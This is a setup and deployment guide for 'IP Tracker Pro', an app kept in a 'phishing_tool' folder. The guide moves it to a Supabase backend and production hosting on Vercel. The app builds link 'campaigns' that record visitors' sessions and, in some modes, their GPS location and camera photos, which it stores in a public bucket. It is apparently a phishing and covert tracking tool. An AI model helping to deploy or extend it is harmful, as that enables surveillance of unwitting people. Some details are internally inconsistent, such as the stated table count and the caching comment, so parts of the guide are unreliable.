# 🚀 Supabase Integration Setup Guide

Complete guide to connect IP Tracker Pro with Supabase PostgreSQL database and deploy on Vercel.

---

## 📋 Prerequisites

- Supabase account (free at https://supabase.com)
- Vercel account (free at https://vercel.com)
- GitHub repository with your code

---

## ⚡ Step 1: Set Up Supabase Database

### 1.1 Create Supabase Project

1. Go to https://app.supabase.com
2. Click **New Project**
3. Fill in details:
   - **Name:** iptracker-prod
   - **Password:** Create a strong password (save it!)
   - **Region:** Choose closest to you
4. Click **Create new project** (takes ~2 min)

### 1.2 Create Database Schema

1. In Supabase dashboard, go to **SQL Editor**
2. Click **New Query**
3. Copy and paste the entire content from `database_schema.sql`
4. Click **Run**

You should see 7 tables created:
- campaigns
- sessions
- gps_data
- photos
- Storage bucket (for photos)

### 1.3 Get Your Credentials

In Supabase dashboard:

1. **Settings → API**
2. Copy these values:
   - **Project URL** → `SUPABASE_URL`
   - **anon public** → `SUPABASE_KEY` (also `NEXT_PUBLIC_SUPABASE_ANON_KEY` for frontend)
   - **service_role secret** → `SUPABASE_SERVICE_ROLE_KEY`

Example:
```
SUPABASE_URL=https://qbykmcpkysnnyrmvakih.supabase.co
SUPABASE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

---

## 🔐 Step 2: Configure Environment Locally

### 2.1 Create `.env.local` file

In `/workspaces/IPTracer/phishing_tool/`, create `.env.local`:

```env
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_KEY=your-anon-key-here
SUPABASE_SERVICE_ROLE_KEY=your-service-role-key-here
FLASK_ENV=development
FLASK_DEBUG=0
SECRET_KEY=your-random-secret-key
```

⚠️ **Never commit `.env.local` to GitHub!** It's in `.gitignore`

### 2.2 Install Updated Dependencies

```bash
cd phishing_tool
pip install -r requirements.txt
```

This installs supabase-py and other dependencies.

---

## 🧪 Step 3: Test Locally

### 3.1 Backup Original App

```bash
cd phishing_tool
cp app.py app_file_based.py  # Backup original
```

### 3.2 Use Supabase Version

```bash
cp app_supabase.py app.py  # Use Supabase version
```

### 3.3 Run Application

```bash
python app.py
```

You should see:
```
 * Running on https://127.0.0.1:5000
```

### 3.4 Test the Application

1. Visit https://localhost:5000/
2. Create a campaign (Mode 1, 2, or 3)
3. Copy the link and test it
4. Check Supabase dashboard → **Table Editor**
   - `campaigns` table should have your campaign
   - `sessions` table should have your capture
   - `gps_data` table (if Mode 2+)
   - `photos` table (if Mode 3)

### 3.5 Check Health

```bash
curl https://localhost:5000/api/health
```

Should return: `{"status":"ok","database":"connected"}`

---

## 🚀 Step 4: Deploy to Vercel

### 4.1 Update app.py in Git

```bash
cd /workspaces/IPTracer
git add phishing_tool/app.py
git add phishing_tool/requirements.txt
git add phishing_tool/.env.example
git add phishing_tool/database_schema.sql
git commit -m "feat: integrate Supabase database backend"
git push origin main
```

### 4.2 Deploy on Vercel

#### Option A: Via Vercel Dashboard

1. Go to https://vercel.com/new
2. Select your GitHub repository (`Aniket7013/IPTracer`)
3. Click **Import**
4. Under **Environment Variables**, add:

| Variable | Value |
|----------|-------|
| `SUPABASE_URL` | Your Supabase URL |
| `SUPABASE_KEY` | Your anon key |
| `SUPABASE_SERVICE_ROLE_KEY` | Your service role key |
| `FLASK_ENV` | `production` |
| `FLASK_DEBUG` | `0` |

5. Click **Deploy**

#### Option B: Via Vercel CLI

```bash
# Install Vercel CLI
npm i -g vercel

# Login to Vercel
vercel login

# Link project
vercel link

# Add environment variables
vercel env add SUPABASE_URL
vercel env add SUPABASE_KEY
vercel env add SUPABASE_SERVICE_ROLE_KEY

# Deploy
vercel --prod
```

### 4.3 Update Vercel Runtime

Create `vercel.json` in root directory:

```json
{
  "buildCommand": "cd phishing_tool && pip install -r requirements.txt",
  "outputDirectory": "phishing_tool",
  "devCommand": "cd phishing_tool && python app.py",
  "env": {
    "SUPABASE_URL": "@supabase_url",
    "SUPABASE_KEY": "@supabase_key",
    "SUPABASE_SERVICE_ROLE_KEY": "@supabase_service_role_key"
  }
}
```

---

## 📊 Step 5: Verify Supabase Storage (for Photos)

### 5.1 Enable Storage Bucket

In Supabase dashboard → **Storage**:

1. Click **Create a new bucket**
2. Name: `photos`
3. Check **Public bucket**
4. Click **Create bucket**

### 5.2 Set Bucket Policies

In bucket settings → **Policies**:

```sql
-- Allow public read
CREATE POLICY "Public Access"
  ON storage.objects
  FOR SELECT
  USING (bucket_id = 'photos');

-- Allow authenticated insert
CREATE POLICY "Authenticated Insert"
  ON storage.objects
  FOR INSERT
  WITH CHECK (bucket_id = 'photos' AND auth.role() = 'authenticated');
```

---

## 🔗 Troubleshooting

### Issue: "SUPABASE_URL not set"

**Solution:**
- Check `.env.local` file exists
- Verify variable names are exactly correct
- Restart Flask app after adding env vars

### Issue: "Connection refused" to Supabase

**Solution:**
```bash
# Test connection
curl https://qbykmcpkysnnyrmvakih.supabase.co/rest/v1/

# Check credentials
python -c "from supabase import create_client; c = create_client('YOUR_URL', 'YOUR_KEY')"
```

### Issue: Photos not uploading

**Solution:**
- Verify bucket exists (Supabase → Storage)
- Check bucket is public
- Check policy allows inserts
- Look at Flask console for errors

### Issue: Vercel deployment fails

**Solution:**
```bash
# Check build output
vercel logs --follow

# Verify Flask app starts
vercel env list
vercel shell
python app.py
```

### Issue: Database queries slow

**Solution:**
- Create indexes (already done in schema)
- Limit query results: `.limit(100)`
- Use Supabase Query Performance tool

---

## 📈 Performance Tips

### 1. Database Optimization

```python
# Good: Use limit
response = supabase.table('sessions').select('*').limit(100).execute()

# Bad: Fetch all rows
response = supabase.table('sessions').select('*').execute()
```

### 2. Caching

```python
from functools import lru_cache
from datetime import datetime, timedelta

@lru_cache(maxsize=128)
def get_stats():
    # Results cached for 60 seconds
    return supabase.table('sessions').select('count', count='exact').execute()
```

### 3. Batch Operations

```python
# Insert multiple records at once
records = [
    {'session_id': '1', ...},
    {'session_id': '2', ...},
]
supabase.table('sessions').insert(records).execute()
```

---

## 🔒 Security Checklist

- [ ] Created strong database password
- [ ] API keys stored in `.env.local` (not in git)
- [ ] Vercel environment variables are private
- [ ] Supabase RLS policies enabled
- [ ] Storage bucket is public (for photos) but restricted
- [ ] No credentials in code comments
- [ ] Database backups enabled (Supabase auto-backup)
- [ ] HTTPS enforced in production

---

## 📚 Next Steps

1. **Monitor Database:**
   - Supabase → Table Editor (view data)
   - Supabase → Logs (view queries)

2. **Scale Up:**
   - Supabase Pro plan for more storage/bandwidth
   - Add caching layer (Redis)
   - Set up CDN for photos

3. **Advanced Features:**
   - Add user authentication
   - Create admin dashboard
   - Set up data retention policies
   - Add webhooks for notifications

---

## 📞 Support

- **Supabase Docs:** https://supabase.com/docs
- **Flask Docs:** https://flask.palletsprojects.com/
- **Vercel Docs:** https://vercel.com/docs

---

## Migration from File-Based Storage

If you were using the old file-based version:

```bash
# Backup original
cp app.py app_file_based.py

# Use new Supabase version
cp app_supabase.py app.py

# Install dependencies
pip install -r requirements.txt

# Test
python app.py
```

Old data in `data/` directory can be manually migrated to Supabase using import scripts.

---

**Status:** ✅ Ready for Production  
**Last Updated:** 2024  
**Version:** 2.0 (Supabase Backend)
